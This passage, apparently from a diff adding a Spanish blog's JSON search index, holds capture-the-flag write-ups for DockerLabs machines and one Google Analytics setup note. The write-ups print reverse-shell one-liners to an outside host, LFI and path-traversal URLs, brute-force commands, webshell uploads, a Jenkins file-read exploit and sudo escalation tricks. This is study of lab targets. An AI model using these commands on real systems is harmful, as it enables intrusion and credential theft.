este tipo y pasarle el hashComo vemos nos da el mismo pass que hydra.La cuestion es que lo queria descifrar en local y ni con john ni con openssl pude, no se si con openssl estaba haciendo una burrada pero bueno asi aprendemos, no hay perdidas de tiempo solo callejones en los que aprendemos a no  meternos .Busque un script que hace el trabajo.Ahora ya root.Hasta aqui la maquinita con diversos ataques para ek mismo resultado.Comenten si ven algo mal y avisen que es de agradecer.Un saludo y muchas graciasDifundan"
+  },
+  
+  {
+    "title": "SecretJenkins , DockerLabs",
+    "url": "/posts/secretjenkins/",
+    "categories": "DockerLabs",
+    "tags": "ctf, hacking, etico",
+    "date": "2024-05-10 00:00:00 -0300",
+    
+
+
+
+
+
+    
+    "snippet": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema  , fuzzing de directorios , explotacion de jenkins , obtencion de hashes ,crak password , escalada ...",
+    "content": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema  , fuzzing de directorios , explotacion de jenkins , obtencion de hashes ,crak password , escalada con python.Herramientas y recursos usados  nmap  Feroxbuster  John the riper  scp  Python Library hijackingEnumeracionEmpezamos lanzando un nmap contra el objetivo .sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -vvv 172.17.0.2 -oX SecretJenkinsReporte nmapNmap nos informa que tenemos el 22 abierto y el 8080 corriendo un servidor web con jenkins.Empezmos con jenkins intentando averiguar la version para ver si se puede explotar de algun modo.Lanzo whatwebYa sabemos la version ahora busquemos como explotarla.Explotacion jenkinsexploit CVE-2024-23897chmod +x jenkins_fileread.py./jenkins_fileread.py -u http://$ipvictimaLeemos y nos copiamos a nuestra maquina el contenido de /etc/passw y /etc/shadow.Craking con johnLos unimos haciendo uso de unshadowunshadow passwd shadow &gt; unshadowjohn unshadowInfiltracionTenemos suerte y cuando encuetra la pass de bobby corto el craking y entro con bobby.Nos aprovechamos de python para convertirnos en pinguino.sudo -u pinguinito python -c 'import os; os.system(\"/bin/sh\")'Ya somo el usuario pinguinito ahora toca ser root haber que encontramos.Escalada FinalComo vemos tenemos la misma escalada que en la maquina library.Asi que hacemos lo mismo heber si funciona tambien en esta.Nos creamos un script en python llamado shutil.py y lo añadimos al PATH , despues ejecutamos con sudo.Contenido del scriptimport os os.system(\"/bin/sh\")Directorio de trabajoEjecutamossudo /usr/bin/python3 /opt/script.shHasta aqui la maquinta , pls insert more coinsGracias por leer compartamos conocimiento."
+  },
+  
+  {
+    "title": "Library , DockerLabs",
+    "url": "/posts/library/",
+    "categories": "DockerLabs",
+    "tags": "ctf, hacking, etico",
+    "date": "2024-05-10 00:00:00 -0300",
+    
+
+
+
+
+
+    
+    "snippet": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema  , fuzzing de directorios , library path hijacking python.Herramientas y recursos usados  nmap  Fer...",
+    "content": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema  , fuzzing de directorios , library path hijacking python.Herramientas y recursos usados  nmap  Feroxbuster  Hydra  PythonEnumeracionEmpezamos lanzando un nmap contra el objetivo .sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -vvv 172.17.0.2 -oX libraryReporte nmapNos dice que tenemos el 22 y el 80 primero revisamos la web a ver que encontramos es la de default y no hay nada , mientras revisamos codigo lanzamos feroxbuster.feroxbuster -t 400 -e -x php,txt,html,jpg,json,js -s 200 -u http://172.17.0.2Como podemos ver nos muestra un index php y un direcotorio js.investigamos la web.En index php nos tira un dato y la unica logica que veo es que sea una password y en los directorios no tenemos permisos de escritura.Solo se me ocurre usar hydra y rockyou dado que tambien teniamos el 22  abierto. hydra -L ../../../rockyou.txt -p JIFGHDS87GYDFIGD ssh://172.17.0.2 -t 4InfiltracionCon las credenciales ya podemos probar por ssh con los datos que nos dio hydra.Como siempre ni bien entramos comprobamos lo mas tipico , sudo , find ,script en directorios etc….con sudo -l tenemos suerteVamos a revisar que hace ese script.Como vemos llama a una libreia y esa es la parte que nos interesa.Explotacion y escalada final.Ahora que sabemos lo que hace y usa el script y conocemos como funciona el path, lo unico que tendremos que hacer sera trasladornos a un directorio donde tengamos permisos de escritura.Creamos un archivo con nombre  shutil.py , añadimos esa ruta al PATH y ejecutaremos el script con sudo.El contenido del la libreria que creamos puede variar dependiendo del objetivo que queramos. Lo mas facil para mi seria mandarme una revshell o modificar los permisos de bash con chmod +x y luego ejecutando bash -p  esto es a gusto.Primero creo mi libreria.import osos.system(\"bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.0.112/443 0&gt;&amp;1'\")Añadimos al PATH la ruta de la libreria nueva.Y por ultimo ejecutamos.Hasta aqui la maquina.Saludos y muchas gracias por leer, pueden comentar dudas o si la han resuleto de otra forma debatamos cual metodo es mas eficaz."
+  },
+  
+  {
+    "title": "Asucar , DockerLabs",
+    "url": "/posts/asucar/",
+    "categories": "DockerLabs",
+    "tags": "ctf, hacking, etico",
+    "date": "2024-05-10 00:00:00 -0300",
+    
+
+
+
+
+
+    
+    "snippet": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema , explotacion LFI wordpres ,fuerza bruta ssh y escalada final muy curiosa .Herramientas y recursos ...",
+    "content": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema , explotacion LFI wordpres ,fuerza bruta ssh y escalada final muy curiosa .Herramientas y recursos usados  nmap  nslookup  wpscan  puttygenEnumeracionEmpezamos lanzando un nmap contra el objetivo .sudo nmap -p- -sS -sC -sV -n -oX asucar 172.17.0.2Reporte nmapNmap nos informa que tenemos el 22 abierto y el 80 corriendo un wordpress en su version 6.5.3.Cuando entro a la web la veo que no carga bien los estilos .nslookup 172.17.0.2Añadimos a /etc/hosts recargamos la web y la revisamos.No soy capaz de encontrar nada util ,en google encuentro esto.Lo cual tampoco sirve pues no esta instalado dicho plugin.Ejecuto wpscanwpscan --api-token xxxxxxxxxxxxxxxxxx --url http://asucar.dl --enumerate u,vpTengo suerte y me halla un local file inclusion.Buscamosen google exploit wordpress site editor lfi y el primer resultado.InfiltracionAjustamos la ruta y probamos.http://asucar.dl/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwdTenemos exito y ya tenemos usuario es hora de hydra. hydra -l curiosito -P rockyou.txt ssh://172.17.0.2 -t 4Hacemos login y ejecutamos lo de siempre.Me encuentro con un binario con el que nunca he hecho la escalada puttygen a tirar de google para ver como funciona el puttygen.Nos sirve para crear claves ssh , he proabado de distintas formas pero por temas de permisos de escritura no consegui hacerlo como queria , asi que hay que hacerlo primero en el home del usario con el que estamos conectados y luego copiar lo creado con sudo puttygen para poder escribir en el directorio de root.Primero creamos las claves:puttygen -t rsa -b 2048 -O private-openssh -o ~/.ssh/hackedEl siguiente paso es añadir el contenido de la clave publica que extraemos de la privada añadiendolo a authorized_keysputtygen -L ~/.ssh/hacked &gt;&gt; ~/.ssh/authorized_keysYa tenemos todo listo en el directorio del usario pero lo queremos en root , en este momento es cuando realmente abusamos de puttygen usandolo con sudo para copiar a su directorio.Copiamos la clave.sudo puttygen /home/curiosito/.ssh/hacked -o /root/.ssh/hackedAñadimos la clave al authorized_keyssudo puttygen /home/curiosito/.ssh/hacked -o /root/.ssh/authorized_keys -O public-opensshPor ultimos podemos descargar la clave o conectarnos desde el mismo terminal.ssh -i /home/curiosito/.ssh/hacked root@localhostEsta se me complico buscando info de puttygen mucha mierda de windows me salia.Gracias por leer."
+  },
+  
+  {
+    "title": "ChocolateLovers , DockerLabs",
+    "url": "/posts/chocoletelovers/",
+    "categories": "DockerLabs",
+    "tags": "ctf, hacking, etico",
+    "date": "2024-05-09 00:00:00 -0300",
+    
+
+
+
+
+
+    
+    "snippet": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema  , fuzzing de directorios y de parametros y por ultimo escalada.Herramientas y recursos usados  nma...",
+    "content": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema  , fuzzing de directorios y de parametros y por ultimo escalada.Herramientas y recursos usados  nmap  Feroxbuster  Exploit nibbleEnumeracionEmpezamos lanzando un nmap contra el objetivo .sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -vvv 172.17.0.2 -oX ChocolateReporte nmapRevisamos la web a ver que encontramos es la de default , mientras le miramos el codigo lanzamos , feroxbuster.Encontramos un comentario que hace alusion a un cms. Modificamos parametros en ferox buster y lo lanzamos a la nueva ruta.feroxbuster -t 400 -e -x php,txt,html,jpg,json,js -s 200 -u http://172.17.0.2/nibbleblogComo podemos ver nos muestra todo lo que hay incluso el login ,vamos al login directos no parece que se hay modificado nada y sea una instalacion totalmente limpia.Estamos de suerte con password por defecto y dentro.Vamos a buscar la version del nibbleblog y buscar en google que se puede hacer.San google.En todo lo que he mirado activan un plugin “my image” despues suben su archivo malicioso , si no he leido mal tambien lo podeis hacer con msfconcole.ExplotacionActivo plugin cargando el fichero.Una vez cargado solo que queda ir a la url correcta.Ahora nos enviamos una revshell , primero nc a la escucha.nc -lnvp 443Y en la webshell.Infiltracion y movimientos lateralesYo en la conexion recibida hacemos un sudo -l .Podemos convertinos en el usario chocolate usando php , para ello hacemos caso a searchbins.Ahora ya como usuario chocolate volvemos a buscar como escalar.Encontramos un script ejecutado por root pero en el que podemos escribir.loverComo yo sigo con mis problemas con las revshells y los editores de texto (todos me dicen unknown terminal).Escalada FinalCreo un archivo con el mismo nombre en mi computador y lo subo a traves de python en atacante y wget en victima , me espero 5 segundos a que se ejecute y bualaaa!!!!  Como revshell utilice la de pentestmonkeySaludos y muchas gracias por leer, pueden comentar dudas o si la han resuleto de otra forma debatamos cual metodo es mas eficaz."
+  },
+  
+  {
+    "title": "Inclusion , DockerLabs",
+    "url": "/posts/inclusion/",
+    "categories": "DockerLabs",
+    "tags": "ctf, hacking, etico",
+    "date": "2024-05-08 00:00:00 -0300",
+    
+
+
+
+
+
+    
+    "snippet": "En este reto de DockerLabs  nos encontramos con escaneo de puertos , path traversal , fuerza bruta y escalada final.Herramientas y recursos usados  nmap  Path traversal  hydra  Movimiento lateral  ...",
+    "content": "En este reto de DockerLabs  nos encontramos con escaneo de puertos , path traversal , fuerza bruta y escalada final.Herramientas y recursos usados  nmap  Path traversal  hydra  Movimiento lateral  searchbinsEnumeracionEmpezamos lanzando un nmap contra el objetivo .sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -vvv 172.17.0.2 -oX inclusionReporte nmapNmap nos indica que tenemos el 22 y el 80 revisamos la web a ver que encontramos, mientras miramos , lanzamos gosbustergobuster -q dir -w /usr/share/dirbuster/directory-list-2.3-medium.txt -x html,htm,php,txt,xml -u http://172.17.0.2/cmsms --exclude-length 3690El output nos dice que encontro el directorio shop asi que a mirar y revisar el codigo , vuelvo a lanzar gobuster contra shop pero no hay nada mas.En la web principal encontramos el siguente error que nos da una pista\"Error de Sistema: ($_GET['archivo']\"); Nos dice que la url espera la carga de un parametro a traves de archivo intentemos leer ficherosTenemos path traversal , intente cargar algunos logs sin exito para convertir el path traversal en un rce a traves de un log poisoning sin exito.Asi que vamos a lo tipico buscar usuarios o passwords para realizar fuerza bruta.InfiltracionPodemos leer passwd y encontramos dos usuarios asi que fuerza bruta.Contra seller se demoraba una eternidad y no es cuestion asi que probe el otro y en 10 segundos la obtuvo .A conectarnos con mancho por ssh.Como vemos no tenemos nada ni con sudo , ni con find , nada en cron ni con ps aux asi que imagino sera como la otra maquina en la que habia que hacer fuerza bruta contra contra el usario localmente y para ello nos traeremos unas pocas cosas hacia la maquina victima.  rockyou  script para hacer fuera bruta “busca el del creador de DockerLabs”  pspy “por paranoia mia no es necesario”Movimiento lateralCon todo en la maquina victima lanzamos el ataque como indica el script.sudo ./Linux-Su-Force.sh usario diccionarioNos pasamos a seller, esto entiendo que seria un movimiento lateral.Ya en seller ejcecutamos lo tipico sudo y demas para intentar averiguar como va la escalada final.Escalada finalSearchbins recomiendo instalarla.Lo que hacemos con este comando en crear una variable llamada cmd que es /bin/sh y con sudo como root decimos que php llame a cmd.Como vemos tenemos php y con searchbins como realizarlo.A convertirnos en root.Saludos y muchas gracias por leer, pueden comentar dudas o comentar como la han resuelto."
+  },
+  
+  {
+    "title": "Analytics en chirpy jekyll",
+    "url": "/posts/gajekill/",
+    "categories": "Software",
+    "tags": "analytics, jekyll",
+    "date": "2024-05-08 00:00:00 -0300",
+    
+
+
+
+
+
+    
+    "snippet": "Aqui vamos a explicar como tengo configurado mi entorno de jekill con el theme chirpy 6.5.5 y google analytics funcionando.Me encontraba el siguiente problema;al tratar de configurarlo todos los ma...",
+    "content": "Aqui vamos a explicar como tengo configurado mi entorno de jekill con el theme chirpy 6.5.5 y google analytics funcionando.Me encontraba el siguiente problema;al tratar de configurarlo todos los manuales hablan de añadir al head el trocito de script que te proporciona google pues bien en el directorio de donde hacemos el build no hay layouts ni include en este tema, otros que he probado si los incluyen en el mismo directorio.Para este tema en concreto todo lo que encontre era que tenia que editar el _confyg.yml estableciendo el site verification y id de google analytics.Haciendo solo esas dos ediciones solo me aparecia el site verification cuando consultaba el codigo resultante despues de hacer el build.Esta claro que el error era que no se estaba incluyendo en el head el codigo necesario.Algunos sugieren crear los archivos y los directorios pero si el sitio se construye correctamente y sin errores significa que en algun lugar tienes los archivos.Asi que busquemos con find donde pueden estar, eso dependera de tu config de rubi puede ser en tu usuario o /usr/share/ .Buscamos por el nombre del directorio donde deberian estar los archivos que tenemos que ver y trabajar.find / -type d -name _layouts 2&gt;/dev/nullDirectorio de desarolloDirectorio de instalacion del themeComo podemos ver en la segunda foto tenemos todo y no tenemos necesidad de crear directorios ni archivos , solo editaremos dos archivos el _config.yml y en el caso del tema chirpy si queremos que haga seguimiento de de todo el site el default.hmtlPrimero insertamos los datos en el yml.google_site_verification : Tu codigogoogle_analytics:    id: tu id para la recogida de datos.Luego editamos el archivo default.html qu se ubica en _layouts añadiendo el segundo include que ven en la imagen de abajo.Ahora solo nos queda construir y probar localmente si todo a ido bien.bundle exec jekyll serveSi todo a ido bien nos vamos a la web y buscamos su codigo fuente.Ahora ya esta todo bien de la parte de jekyll si falla algo de la parte de configuracion de analytics"
+  },
+  
+  {
+    "title": "Firsthacking , DockerLabs",
+    "url": "/posts/firsthacking/",
+    "categories": "DockerLabs",
+    "tags": "ctf, hacking, etico",
+    "date": "2024-05-08 00:00:00 -0300",
+    
+
+
+
+
+
+    
+    "snippet": "En este reto de DockerLabs  nos encontramos con una maquina sumamente facil con escaneo de puertos y explotacion a traves de exploitHerramientas y recursos usados  nmap  searchsploit  msfconsole  p...",
+    "content": "En este reto de DockerLabs  nos encontramos con una maquina sumamente facil con escaneo de puertos y explotacion a traves de exploitHerramientas y recursos usados  nmap  searchsploit  msfconsole  pythonEnumeracionEmpezamos lanzando un nmap contra el objetivo .sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -vvv 172.17.0.2 -oX firsthackingReporte nmapNmap nos indica que tenemos el 21 que coresponde al servicio ftp fijaos en la version, si solo tenemos ese acceso no hay otra que buscar por ese servicio y con esa version de software.Vamos al grano pq en mi opinion esta deberia ser muy facil o es la resaca de haber intentado hacer la hacktheheaven sin exito.Asi que sin mas ejecutamossearchsploit vsftpdObtenemos lo que esperabaExplotacionCon la info ya conseguida vamos a msfconsole y intducimos lo siguente.search vsftp  use 1show optionsset RHOSTS $ipvictimarunComo veis en la segunda imagen somos root.Con pythonexploitEste exploit necesita de la instalacion de pwntools creo un entrono virtual para no tener mierda por ahi .python3 -m venv vsftpd2.4source  vsftpd2.4/bin/activate pip3 install pwntoolsgit clone https://github.com/Hellsender01/vsftpd_2.3.4_Exploit.githubcd  vsftpd_2.3.4chomd +x exploit.pypython3 exploit.py $ipvictimaEsta maquina es para aprender a usar google si la comparas con la que nombraba antes que es un infireno para el que esta aprendiendo.En fin hasta la proxima maquina."
+  },
+  
+  {
+    "title": "Whereismywebshell , DockerLabs",
+    "url": "/posts/whereismywebshell/",
+    "categories": "DockerLabs",
+    "tags": "ctf, hacking, etico",
+    "date": "2024-04-30 00:00:00 -0300",
+    
+
+
+
+
+
+    
+    "snippet": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema  , fuzzing de directorios y de parametros y por ultimo escalada.Herramientas y recursos usados  nma...",
+    "content": "En este reto de DockerLabs  encontramos con escaneo de puertos para buscar una entrada al sistema  , fuzzing de directorios y de parametros y por ultimo escalada.Herramientas y recursos usados  nmap  wfuzzEnumeracionEmpezamos lanzando un nmap contra el objetivo .sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -vvv 172.17.0.2 -oX whereisReporte nmapRevisamos la web a ver que encontramos es una web de una academia mientras le miramos el codigo lanzamos gobuster.Vamos directos a gobustergobuster -q dir -w /usr/share/dirbuster/directory-list-2.3-medium.txt -x html,htm,php,txt,xml -u http://172.17.0.2/cmsms --exclude-length 3690La salida nos arroja varios archivos prometedores ,el warning y lo que be ser una webshell.Primero miro el warning por si nos dijera algo , no arroja luz de ningun tipo asi que caragmos shell php y vemos una pagina en blanco, en este punto vamos a fuzzear la palabra que nos falta para poder ejecutar comandos remotos.Asi que vamos a fuzzear con wffuz.wfuzz -c --hl=0 -t 200 -w /usr/share/dict/wordlist-probable.txt -u \"http://172.17.0.2/shell.php?FUZZ=id\"Una vez obtenido el parametro pasamos a probar si podemos ejecutar comandos.Resultado positivo , mandemos una rev shell.Ejecutamos lo siguiente pero primero nectact a la escucha.sudo nc -lvnp 443En la webshellbash -c \"bash -i &gt;&amp; /dev/tcp/192.168.0.112/443 0&gt;&amp;1\"RecepcionEscaladaLo primero una vez reciba la revshell le aplicamos tratamiento.script /dev/null -c bashLa mandamos al background con control-Z.export TERM=xtermexport SHELL=bashSi queremos ajustarla al maximo debemos indicarle el numero de lineas y columnas de nuestra terminal .  Para ver el numero de line y columms de nuestra term ejecutamos respectivamente  echo $LINES y echo $COLUMMS  Ya configurada empezamos a mirar con sudo -l y find.Ninguno nos devuelve nada y ahi recorde que hemos de acostumbrarnos a mirar hacia atras y recordar todo lo que mos hemos ido encontando en la maquina.La memoria me decia que guardaba un secreto en /tmp/ , asi que vamos a mirar que nos dejaron.cd /tmp/ls -laLa puso facil esta vez.su Saludos y muchas gracias por leer, pueden comentar dudas o si la han resuleto de otra forma debatamos cual metodo es mas eficaz."
+  },
+  
+  {
+    "title": "Summervibes , DockerLabs",
+    "url": "/posts/summervibes/",
+    "categories": "DockerLabs",
+    "tags": "ctf, hacking, etico",
+    "date": "2024-04-29 00:00:00 -0300",
+    
+
+
+
+
+
+    
+    "snippet": "En este reto nos encontramos con escaneo de puertos para buscar una entrada al sistema  , enumeracion con con gobuster , explotacion de cve , revshell y escaladaHerramientas y recursos usados  nmap...",
+    "content": "En este reto nos encontramos con escaneo de puertos para buscar una entrada al sistema  , enumeracion con con gobuster , explotacion de cve , revshell y escaladaHerramientas y recursos usados  nmap  gobuster  hydra  cveEnumeracionEmpezamos lanzando un nmap contra el objetivo .sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -vvv 172.17.0.2 -oX summervibes Reporte nmapRevisamos la web a ver que encontramos , buscamos en codigo fuente y encontramos lo siguiente.Asi que vamos a chusmear y de paso lanzamos un gobuster contra ese directorio.Vamos directos a gobustergobuster -q dir -w /usr/share/dirbuster/directory-list-2.3-medium.txt -x html,htm,php,txt,xml -u http://172.17.0.2/cmsms --exclude-length 3690Miramos la version del cms , espero no lo hayan editado para despistar.En gobuster tambien vimos un directorio login para el admin , asi que investigamos en la web sobre este cms y como explotarlo.Para poder abusar de este cms si o si y con cualquier cve asociado  necesitamos tener privilegios administrativos.Voy a probar contra admin con rockyou como dic y podemos usar hydra por ejemplo.hydra -l admin -P ~/rockyou.txt 172.17.0.2 http-post-form \"/cmsms/admin/login.php:username=^USER^&amp;password=^PASS^&amp;&amp;loginsubmit=Submit:User name or password incorrect\" -VIExplotacionAhora que tenemos el user y pass vamos a explotar ese cveNos vamos a la pagina de login y nos conectamos.Se nos muestra panel de administracion del cms , como no se como hacerlo paso a buscar como se realiza ese exploit.El que nos interesa es el rec y buscando encuentro.Sigo las instruciones y listo.  Log in as AdministratorAccess the CMS Made Simple admin panel and log in with administrator credentials.Navigate to User Defined TagsGo to Extensions &gt; User Defined Tags.Inject PayloadIn the 'Code' text area, input the following payload:&lt;?php echo system('id'); ?&gt;This PHP code, when executed, will display the system user and group IDs.Execute the PayloadClick on the 'Run' button to execute the payload.Observe the OutputThe output should be similar to:uid=1000(admin) gid=1000(admin) groups=1000(admin) uid=1000(admin) gid=1000(admin) groups=1000(admin)This indicates successful execution of the code, displaying the server process’s user and group IDsDespues de comprobar lo tipico id whoami me dispongo a lanzar una revshel no sin antes dejar netcat a la escucha.InfiltracionYa tenemos la revshell la configuramos y empezamos con lo facil y rapido , ni sudo, ni find nos da resultado , el cms  deberia de tener un bbdd pero no nos la mostro nmap y el cms ha de tener un config asi que buscamos primero el config.Escaladafind / -name config.php 2&gt;/dev/nullBuscamos el servico mysql.ssIntento comprobar tambien con systemctl y ya me huelo medio raroporque me da error.Vamos a intentar conectar a la base de datos con las credenciales de webA mi ya solo se me ocurre hacer fuerza bruta  asi me me dispongo a usar el script que hizo el pinguino.Me copio el script y el diccionario../suforce.sh root rockyou.txt  Le modifique el timeout al script pq no lo pillada hice que fuese mas lento y que mala memoria la mia de no haber probado las contareñas que ya teniamos  Ni con root entre en la bbddSaludos y muchas gracias por leer"
+  },
+  
+  {
+    "title": "Hidden , DockerLabs",
+    "url": "/posts/hidden-docker/",
+    "categories": "DockerLabs",
+    "tags": "ctf, hacking, etico",
+    "date": "2024-04-27 00:00:00 -0300",
+    
+
+
+
+
+
+    
+    "snippet": "En este reto nos encontramos con escaneo de puertos para buscar una entrada al sistema  , enumeracion con con gobuster y busqueda de subdominios con wfuzz , revshell , movimientos laterales y escal...",
+    "content": "En este reto nos encontramos con escaneo de puertos para buscar una entrada al sistema  , enumeracion con con gobuster y busqueda de subdominios con wfuzz , revshell , movimientos laterales y escalada final.Herramientas y recursos usados  nmap  gobuster  wfuzzEnumeracionEmpezamos lanzando un nmap contra el objetivo , el cual nos devuelve que solo se encuentra el 80 abierto y podemos ver como nos dice que no consigue llegar a hidden.labsudo nmap -p- -sS -sC -sV --min-rate=5000 -n -vvv 172.17.0.2 -oX hidden_nmap Reporte nmapAntes de poder revisar la web debemos añadir lo que nos dice nmap al fichero hosts , tambiem aprovechamos y lanzamos gobuster por si encuentra algo.nvim /etc/hostsUna vez editado el fichero vamos a trabajar.gobuster -q dir -w /usr/share/dirbuster/directory-list-2.3-medium.txt -x html,htm,php,txt,xml -u http://hidden.lab --exclude-length 3690Despues de estar un rato mirando la web que creo que es un bootstrap simplemente y hacerme un lio con el formulario de reserva y la ruta que devolvia desisto y pienso que debe haber algo mas, hemos fuzeado directorios con el comando anterior , hemos  revisado la web un buen rato sin frutos asi que vamos a buscar si tuviera algun host virtual.Como no sabia como excluir los errores en gobuster tiro de wfuzz.wfuzz -c -w /usr/share/dirbuster/directory-list-2.3-medium.txt --hc 400,404,403,302 -H \"Host: FUZZ.hidden.lab\" -u http://hidden.lab -t 100Agregamos de nuevo al fichero hosts el virtualhost que nos da wfuzz y pasamos a ver esa otra web.Nos encontramos una subida de archivos y nos indica que un .php no podemos subir , a buscar extensiones que se ejecuten.Primer intento fallido asi que deduzco que apache debe comprobar que es lo que ejecuta y si no coincide chauuuuDocumentacion phpDespues de probar a subir un .phar lo ha subido sin promblema , averiguamos ahora donde esta asi que otra vez a gobustergobuster -q dir -w /usr/share/dirbuster/directory-list-2.3-medium.txt -x html,htm,php,txt,xml -u http://dev.hidden.lab --exclude-length 3690InfiltracionAhora parece estar todo listo el rce y la ruta asi que probamos y acepta comandos a por la revshell.http://dev.hidden.lab/uploads/rce.phar?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.0.112/443%200%3E%261%22Como vemos en la imagen tenemos varios usuarios despues de buscar scripts , suid , sudo , etc no obtengo nada asi que hay que hacer fuerza bruta , busco un script que hizo el pinguino que era para eso linux brute.Por otro lado no podemos subirnos el rockyou completo asi que lo despiezamos y lo subimos por el webupload.Comando para dividir por numero de lineassplit -l 1000 rockyou.txt parte_Ahora que tenemos todo subido al menos la primera parte del rockyou lanzaremos el script y esperemos que la pass este arriba del fichero si no mi paciencia explota porque va de 1000 en 1000.Nos desplazamos al directorio dnd se han subido los archivos y lo ejecutamos con las 1000 pass primeras../Linux-Su-Force.sh cafetero tudiccionarioEscalada de privilegiosSi os fijais en la imagen de arriba podeis ver la importancia de configurar bien la revshell.Por cierto ataco a cafetero por la relacion clara con la web.Pasamos al user cafetero recordamos que hay varios usarios y se debe tratar de ir de uno a otro hasta root.su cafeteroRevisamos como siempre y las veces que necesitemos por cada usuario permisos , scripts , directorios hasta encontrar algo.Con sudo tenemos suerte.Como vemos podemos ejecutar nano como usuario john.Consultamos gtofbins de ser necesario.sudo -u john nanoRepetimos proceso  este usuario “john” con find , sudo  etc en busca de scripts binarios etc..sudo -l En este caso hacemos uso de apt buscamos en searchbins y adelante.Ahora como usuario bobby repetimos de nuevo el proceso.sudo -lAhora vemos que podemos hacer root con findsudo find . -exec /bin/sh \\; -quitGracias por leer y si alguien que lee esto y sabe porque se me vuelve tan loca la terminal agradeceria ayuda.Saludos"
+  },
+  
+  {
+    "title": "walkingcms , DockerLabs",
+    "url": "/posts/walkingcms/",
+    "categories": "DockerLabs",
+    "tags": "ctf, hacking, etico",
+    "date": "2024-04-26 00:00:00 -0300",
+    
+
+
+
+
+
+    
+    "snippet": "En este reto nos encontramos con escaneo de puertos para buscar una entrada al sistema , fuzzing , fuerza bruta y escalada.Herramientas y recursos usados  nmap  feroxbuster  wpscan  searchbinsEnume...",
+    "content": "En este reto nos encontramos con escaneo de puertos para buscar una entrada al sistema , fuzzing , fuerza bruta y escalada.Herramientas y recursos usados  nmap  feroxbuster  wpscan  searchbinsEnumeracionEmpezamos lanzando un nmap contra el objetivo , el cual nos devuelve que solo se encuentra el 80 abierto , podemos ver la web mientras hacemos fuzzing de directorios.Reporte nmapferoxbuster -t 200 -x php,txt,html -u http://172.17.0.2 En el root del 80 solo vemos la web por defecpo de apache , pero el feroxbuster nos encuentra que estamos frente a un wordpress.Revisemos mas a fondo ese wordpress lo primero que se me ocurre es el xmlrcp.php , pero vamos de a poco tirando wpscan.Realizamos enumeracion de usuarios y versiones de plugins.wpscan --url http://172.17.0.2/wordpress/ --enumerate u,vpComo vemos tenemos un usuario y nos indica que podemos seguir por el theme una vez hallemos la contraseña para el user mario.Desde este punto nos encontramos con distintas formas de proceder.Una de ellas es con uso de scripts que puedes crear tu mismo o buscar por github , yo me decanto en este punto por msfconsole.ya dentro de msf ejecutamos lo siguiente.search xmlrpcuse 9set PASS_FILE /home/quino/rockyou.txtset USERNAME marioset RHOST http://172.17.0.2set TARGETURI wordpress/xmlrpc.phprunInfiltracionAhora ya con el user y el pass nos vamos al login y empezamos a trabajar el theme susceptible.Vamos a theme editor y buscamos el index , en ese index le colocamos el codigo de una webshell yo tiro con  webshell por probar.Una vez modificado, guardo el index y podemos ir a cargarlo en la web.http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/index.phpLlegados a este punto nos ponemos a la escucha con nc y nos mandamos una revshell desde la webshell.Recibida la revshell empezamos a averiguar como escalar privilegios, lanzamos sudo , find para empezar.Sudo no esta y con find obtenemos resultados.Tenemos env al lio.Ejecutamos como nos indicaenv /bin/sh -pGracias por leer.Dudas o cuestiones en los comentarios.Saludos"
+  },
+  
+  {
+    "title": "Hackpenguin , DockerLabs",
+    "url": "/posts/hackpenguin/",
+    "categories": "DockerLabs",
+    "tags": "ctf, hacking, etico",
+    "date": "2024-04-26 00:00:00 -0300",
+    
+
+
+
+
+
+    
+    "snippet": "En este reto nos encontramos con el tipico escaneo de puertos para buscar una entrada al sistema , fuzzing , steganografiaHerramientas y recursos usados  nmap  gobuster  stegseekEnumeracionEmpezamo...",
+    "content": "En este reto nos encontramos con el tipico escaneo de puertos para buscar una entrada al sistema , fuzzing , steganografiaHerramientas y recursos usados  nmap  gobuster  stegseekEnumeracionEmpezamos lanzando un nmap contra el objetivo , el cual nos devuelve como puertos abiertos el shh y el http.Reporte nmapMientras revisamos la pagina por default en el 80 , lanzamos gobuster por si encuentra algo.gobuster -q dir -w /usr/share/dirbuster/directory-list-2.3-medium.txt -x html,htm,php,txt,xml -u http://172.17.0.2 --exclude-length 3690Tenemos suerte con gobuster y nos da penguin.html , revisamos la pagina y no hay nada asi que descargamos la imagen por si esconde algo.Usamos steseekstegseek penguin.jpg ../rockyou.txtComo vemos nos da un passphrase y otro fichero , probamos a abrir el fichero con ese passphrase con resultado negativo.Asi que vamos a por el intento de hashsear el fichero y tirar con johnkeepass2john penguin1.kdbx &gt; penguin.txtUna vez tenemos el hash se lo damos a john.Yo lo ejecuto desde un binario compilado por mi en local../john penguin.txtCon la pass que nos tira john abrimos el kdbx para ver que passwords guarda.InfiltracionRecordamos que tenemos chocolate password1 “que ya la usamos” y la que nos ha dado el fichero.Hora de conectar o intentarlo contra ssh con los datos que tenemos.No tenemos suerte en las primeras pruebas manuales , pruebo con otro user que pienso que puede ser el nombre del archivo kdbx.ssh penguin@172.17.0.2Escalada de privilegiosComo de costumbre y mas rapido primero ejuctamos sudo y find como corresponde y niguno devuelve nada que sirva.Revisamos los directorios donde tenemos acceso y encontramos un script que podria servirnos .Tambien podriamos usar find para buscar scripts que podamos modificar.find / -user root -type f -name *.sh 2&gt;/dev/nullUna vez encontrado el script debemos de ver cuando se ejecuta y si se ejecuta.ps -aux | grep rootVemos que lo esta ejecutando asi que lo vamos a editar solo esta nano en la maquina.  Yo aqui no consegui acabar como root pese a haber seguido al final los 